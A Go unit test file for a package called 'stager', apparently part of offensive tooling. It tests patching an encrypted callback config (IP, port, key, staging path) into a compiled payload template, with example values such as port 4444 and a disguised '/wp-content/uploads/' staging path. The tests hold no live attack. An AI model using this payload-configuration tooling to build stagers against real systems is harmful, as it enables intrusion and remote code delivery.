package stager

import (
	"bytes"
	"encoding/binary"
	"testing"
)

func TestPatchTemplateLocatesAndRewrites(t *testing.T) {
	// Build a placeholder blob like the template generator does.
	ip, _ := ResolveIP("1.2.3.4")
	ph, err := Build(Config{IP: ip, Port: 0xBEEF, Key: sentinelKey(), Path: SentinelPath})
	if err != nil {
		t.Fatalf("build placeholder: %v", err)
	}

	// Simulate a compiled image: some NOP padding then the blob (like mingw's
	// alignment), plus trailing garbage.
	tmpl := append(bytes.Repeat([]byte{0x90}, 32), ph...)
	tmpl = append(tmpl, []byte("trailing-garbage")...)

	newIP, _ := ResolveIP("10.0.0.5")
	out, err := PatchTemplate(tmpl, Config{
		IP:   newIP,
		Port: 8080,
		Key:  bytes.Repeat([]byte{0xAB}, 32),
		Path: "/stage/abc123?raw=1",
	})
	if err != nil {
		t.Fatalf("patch: %v", err)
	}

	// Verify the patched config block.
	idx := bytes.Index(out, []byte{0x57, 0x49, 0x53, 0x50})
	if idx < 0 {
		t.Fatal("patched magic not found")
	}
	got := out[idx : idx+configSize]
	if got[4] != 10 || got[5] != 0 || got[6] != 0 || got[7] != 5 {
		t.Fatalf("ip not patched: %v", got[4:8])
	}
	if p := binary.LittleEndian.Uint16(got[8:10]); p != 8080 {
		t.Fatalf("port not patched: %d", p)
	}
	if !bytes.Equal(got[10:42], bytes.Repeat([]byte{0xAB}, 32)) {
		t.Fatal("key not patched")
	}
	if string(bytes.TrimRight(got[42:170], "\x00")) != "/stage/abc123?raw=1" {
		t.Fatalf("path not patched: %q", bytes.TrimRight(got[42:170], "\x00"))
	}
	// NOP padding and trailing bytes untouched.
	if !bytes.Equal(out[:32], bytes.Repeat([]byte{0x90}, 32)) {
		t.Fatal("padding modified")
	}
	if !bytes.HasSuffix(out, []byte("trailing-garbage")) {
		t.Fatal("trailing bytes modified")
	}
}

func TestPatchTemplateRejectsBadConfig(t *testing.T) {
	ip, _ := ResolveIP("1.2.3.4")
	ph, _ := Build(Config{IP: ip, Port: 0xBEEF, Key: sentinelKey(), Path: SentinelPath})
	tmpl := append(bytes.Repeat([]byte{0x90}, 16), ph...)

	// Empty path
	if _, err := PatchTemplate(tmpl, Config{IP: ip, Port: 80, Key: sentinelKey(), Path: ""}); err == nil {
		t.Fatal("expected error for empty path")
	}
	// Wrong key length
	if _, err := PatchTemplate(tmpl, Config{IP: ip, Port: 80, Key: []byte("short"), Path: "/x"}); err == nil {
		t.Fatal("expected error for short key")
	}
}

func TestPatchTemplateFailsWithoutSentinel(t *testing.T) {
	ip, _ := ResolveIP("1.2.3.4")
	_, err := PatchTemplate(bytes.Repeat([]byte{0x90}, 64), Config{IP: ip, Port: 80, Key: sentinelKey(), Path: "/x"})
	if err == nil {
		t.Fatal("expected error when sentinel absent")
	}
}

func TestPatchTemplateBlobRewritesConfig(t *testing.T) {
	// Template: NOP padding + placeholder blob.
	ip, _ := ResolveIP("1.2.3.4")
	ph, _ := Build(Config{IP: ip, Port: 0xBEEF, Key: sentinelKey(), Path: SentinelPath})
	tmpl := append(bytes.Repeat([]byte{0x90}, 16), ph...)

	// New blob with real config.
	newIP, _ := ResolveIP("192.168.1.99")
	real, err := Build(Config{IP: newIP, Port: 4444, Key: bytes.Repeat([]byte{0x11}, 32), Path: "/wp-content/uploads/abc?raw=1"})
	if err != nil {
		t.Fatalf("build real: %v", err)
	}
	out, err := PatchTemplateBlob(tmpl, real)
	if err != nil {
		t.Fatalf("patch blob: %v", err)
	}

	// The patched image must now contain the real config block.
	idx := bytes.Index(out, []byte{0x57, 0x49, 0x53, 0x50})
	if idx < 0 {
		t.Fatal("magic not found after patch")
	}
	got := out[idx : idx+configSize]
	if got[4] != 192 || got[5] != 168 || got[6] != 1 || got[7] != 99 {
		t.Fatalf("ip wrong: %v", got[4:8])
	}
	if p := binary.LittleEndian.Uint16(got[8:10]); p != 4444 {
		t.Fatalf("port wrong: %d", p)
	}
	if !bytes.Equal(got[10:42], bytes.Repeat([]byte{0x11}, 32)) {
		t.Fatal("key wrong")
	}
	if string(bytes.TrimRight(got[42:170], "\x00")) != "/wp-content/uploads/abc?raw=1" {
		t.Fatalf("path wrong: %q", bytes.TrimRight(got[42:170], "\x00"))
	}
}
